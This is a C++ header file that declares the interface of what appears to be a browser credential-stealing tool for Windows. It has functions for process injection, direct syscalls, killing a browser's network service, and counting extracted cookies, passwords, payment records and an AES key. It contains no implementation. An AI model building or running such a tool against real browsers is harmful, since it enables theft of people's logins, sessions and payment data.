#pragma once
#include <string>
#include <filesystem>
#include <optional>
#include <iostream>
#include <Windows.h>

// Forward declarations for types used in the API
class Console;

struct Configuration {
    bool verbose = false;
    std::filesystem::path outputPath;
    std::wstring browserType;
    std::wstring browserProcessName;
    std::wstring browserDefaultExePath;
    std::string browserDisplayName;

    static std::optional<Configuration> CreateFromArgs(int argc, wchar_t* argv[], const Console& console);
};

namespace PipeCommunicator {
    struct ExtractionStats {
        int totalCookies = 0;
        int totalPasswords = 0;
        int totalPayments = 0;
        int profileCount = 0;
        std::string aesKey;
    };
}

// Main API functions
extern "C" {
    [[nodiscard]] BOOL InitializeSyscalls(bool is_verbose);
}
void ProcessAllBrowsers(const Console& console, bool verbose, const std::filesystem::path& outputPath);
PipeCommunicator::ExtractionStats RunInjectionWorkflow(const Configuration& config, const Console& console);
void DisplayExtractionSummary(const std::string& browserName, const PipeCommunicator::ExtractionStats& stats,
    const Console& console, bool singleBrowser, const std::filesystem::path& outputPath);
std::string BuildExtractionSummary(const PipeCommunicator::ExtractionStats& stats);
void KillBrowserNetworkService(const Configuration& config, const Console& console);

// Console class definition
class Console {
public:
    explicit Console(bool verbose);
    void displayBanner() const;
    void printUsage() const;
    void Info(const std::string& msg) const;
    void Success(const std::string& msg) const;
    void Error(const std::string& msg) const;
    void Warn(const std::string& msg) const;
    void Debug(const std::string& msg) const;
    void Relay(const std::string& message) const;
    
    bool m_verbose;
private:
    void print(const std::string& tag, const std::string& msg, WORD color) const;
    void SetColor(WORD attributes) const;
    void ResetColor() const;
    
    HANDLE m_hConsole;
    WORD m_originalAttributes;
};